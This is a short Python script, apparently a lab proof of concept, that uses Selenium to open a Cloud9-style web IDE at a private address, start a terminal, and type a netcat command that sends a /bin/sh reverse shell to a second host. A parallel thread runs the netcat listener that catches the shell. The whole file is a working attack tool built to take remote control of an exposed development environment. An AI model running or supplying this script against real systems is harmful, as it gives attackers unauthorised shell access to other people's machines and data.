#!/usr/bin/python
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from subprocess import call
import threading
import sys



#c9-menu-btn c9-menu-btnBool

def reverseHacker():
    call(["nc", "-l", "-p", "4445", "-vvv"])

def shellHack():
    browser = webdriver.Firefox()
    browser.get('http://192.168.10.15:3000/ide.html')
    try:
        element = WebDriverWait(browser, 60).until(
            EC.presence_of_element_located((By.CLASS_NAME,'plus_tab_button'))
        )
    finally:
        plus_btn = browser.find_element_by_class_name("plus_tab_button")
        browser.implicitly_wait(600)
        ActionChains(browser).click(plus_btn).perform()
        browser.implicitly_wait(30)
        newT = browser.find_element_by_xpath("//*[text()='New Terminal']")
        ActionChains(browser).move_to_element(newT).click().perform()
        term = browser.find_element_by_class_name("ace_content")
        ActionChains(browser).click(term).perform()
        browser.implicitly_wait(600)
        time.sleep(10)
        ta = browser.find_element_by_class_name('ace_text-input')
        ActionChains(browser).send_keys("nc -c /bin/sh 192.168.10.17 4445 \n").perform()
        browser.implicitly_wait(10)
        time.sleep(10)
        browser.quit()
thread1 = threading.Thread(target =shellHack, args = ())
thread2 = threading.Thread(target = reverseHacker, args =())

def prog():
    thread1.start()
    thread2.start()
    thread1.join()
    thread2.join()
    
if __name__ == '__main__':
    try:
        prog()
    except KeyboardInterrupt:
        if thread1.isAlive():
	    print("\nError")
            sys.exit(0)
        else:
            print("Done")
            sys.exit(0)    
